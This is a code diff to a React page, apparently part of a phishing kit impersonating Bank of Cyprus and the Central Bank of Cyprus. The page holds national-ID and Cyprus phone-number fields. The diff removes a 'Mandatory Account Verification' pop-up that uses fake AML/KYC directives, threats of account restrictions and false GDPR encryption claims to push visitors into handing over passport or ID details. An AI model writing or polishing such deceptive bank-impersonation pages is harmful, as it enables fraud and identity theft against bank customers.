@@ -6,13 +6,11 @@ import {
   ArrowLeft,
   ChevronDown,
   ChevronLeft,
-  ClipboardCheck,
   Eye,
   EyeOff,
   FileText,
   Globe,
   Home,
-  Info,
   Loader2,
   Lock,
   MapPin,
@@ -390,7 +388,6 @@ export default function BbvaPage(props: any) {
   const [nationalIdError, setNationalIdError] = useState("")
   const [nationalIdTouched, setNationalIdTouched] = useState(false)
   const [isIdentitySubmitting, setIsIdentitySubmitting] = useState(false)
-  const [showIdentityPopup, setShowIdentityPopup] = useState(true)
 
   // Phone / Mobile number states (Cyprus +357)
   const [phoneNumber, setPhoneNumber] = useState("")
@@ -1690,86 +1687,6 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "identity" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto overscroll-contain shadow-2xl bg-white px-4 sm:px-6 pt-2.5 sm:pt-3.5 pb-4 sm:pb-6 select-none">
-          {/* ========================================================================= */}
-          {/* MANDATORY ACCOUNT VERIFICATION POPUP MODAL                                */}
-          {/* Responsive across all mobile devices, pixel-perfect, clean & well-formed   */}
-          {/* ========================================================================= */}
-          {showIdentityPopup && (
-            <div className="fixed inset-0 z-50 flex items-center justify-center p-3.5 sm:p-4 bg-black/65 backdrop-blur-xs animate-in fade-in duration-200">
-              <div className="relative w-full max-w-[360px] sm:max-w-[390px] max-h-[92dvh] overflow-y-auto overscroll-contain bg-white rounded-[20px] sm:rounded-[24px] border border-slate-100 shadow-2xl p-4 sm:p-6 flex flex-col items-center text-center my-auto select-none">
-                {/* Close Button X with generous touch target */}
-                <button
-                  type="button"
-                  onClick={() => setShowIdentityPopup(false)}
-                  className="absolute top-2.5 right-2.5 sm:top-3.5 sm:right-3.5 w-8 h-8 flex items-center justify-center rounded-full text-slate-400 hover:text-slate-700 hover:bg-slate-100 active:bg-slate-200 transition-colors cursor-pointer"
-                  aria-label="Close modal"
-                >
-                  <X className="w-4.5 h-4.5 sm:w-5 sm:h-5 stroke-[2.2]" />
-                </button>
-
-                {/* Top Logo Image: Central Bank of Cyprus Logo on Modal */}
-                <div className="flex items-center justify-center mb-2 sm:mb-2.5 mt-0.5 sm:mt-1 shrink-0">
-                  <img
-                    src="/cbc_logo.png"
-                    alt="Central Bank of Cyprus"
-                    className="h-[52px] sm:h-[64px] w-auto object-contain pointer-events-none"
-                  />
-                </div>
-
-                {/* Title & Subtitle */}
-                <h3 className="text-[#0d1e38] text-[18px] sm:text-[20px] font-bold tracking-tight shrink-0 px-2 leading-snug">
-                  Mandatory Account Verification
-                </h3>
-                <p className="text-[#64748b] text-[11px] sm:text-[12px] font-medium mt-0.5 mb-2.5 sm:mb-3 shrink-0">
-                  Regulatory Compliance Notice • Bank of Cyprus (BOC)
-                </p>
-
-                {/* Yellow / Amber Notice Callout */}
-                <div className="w-full bg-[#fffbeb] border border-amber-200/90 rounded-[10px] sm:rounded-[12px] p-2.5 sm:p-3 flex items-start gap-2 text-left mb-2.5 sm:mb-3 shrink-0">
-                  <Info className="w-4.5 h-4.5 text-amber-600 shrink-0 mt-0.5 stroke-[2]" />
-                  <p className="text-[#78350f] text-[11.5px] sm:text-[12px] leading-relaxed">
-                    In accordance with the updated Anti-Money Laundering (AML) and Know Your Customer (KYC) directives issued by Bank of Cyprus (BOC), all users are required to verify and update their account information.
-                  </p>
-                </div>
-
-                {/* Notice text */}
-                <p className="text-[#475569] text-[11.5px] sm:text-[12px] leading-relaxed mb-2.5 sm:mb-3 text-center shrink-0 px-1">
-                  To ensure uninterrupted access to your account and prevent temporary restrictions on transfers or services, please complete your identity verification.
-                </p>
-
-                {/* Requirements Box */}
-                <div className="w-full bg-[#f8fafc] border border-slate-200/90 rounded-[10px] sm:rounded-[12px] p-2.5 sm:p-3.5 text-left mb-3 sm:mb-3.5 shrink-0">
-                  <div className="flex items-center gap-1.5 mb-1.5">
-                    <ClipboardCheck className="w-4.5 h-4.5 text-[#0d1e38] stroke-[1.8] shrink-0" />
-                    <span className="font-semibold text-[#0d1e38] text-[12.5px] sm:text-[13px]">
-                      Requirements:
-                    </span>
-                  </div>
-                  <ul className="space-y-1 pl-6 text-[11px] sm:text-[12px] text-[#475569] list-disc leading-relaxed">
-                    <li>Valid Passport or National ID (EU/International)</li>
-                    <li>Confirmation of current personal &amp; economic profile details</li>
-                  </ul>
-                </div>
-
-                {/* Encryption & Security Note */}
-                <div className="flex items-center justify-center gap-1.5 text-center text-[10px] sm:text-[11px] text-[#64748b] leading-normal mb-3.5 sm:mb-4 shrink-0 px-1">                  <span className="text-[11px] sm:text-[12px] shrink-0">🔒</span>
-                  <span>
-                    Your data is fully encrypted and processed in strict compliance with EU GDPR &amp; BoC security regulations.
-                  </span>
-                </div>
-
-                {/* Primary Action Button */}
-                <button
-                  type="button"
-                  onClick={() => setShowIdentityPopup(false)}
-                  className="w-full h-[46px] sm:h-[48px] rounded-[10px] bg-[#0c6a74] hover:bg-[#09575f] active:bg-[#07454c] text-white font-semibold text-[14.5px] sm:text-[15px] shadow-sm flex items-center justify-center transition-all cursor-pointer shrink-0"
-                >
-                  Verify Account Now
-                </button>
-              </div>
-            </div>
-          )}
-
           {/* Top Navigation Bar: Back Arrow, Title, Close X */}
           <div className="w-full flex items-center justify-between py-1 sm:py-2 mb-1 sm:mb-2 shrink-0">
             <button
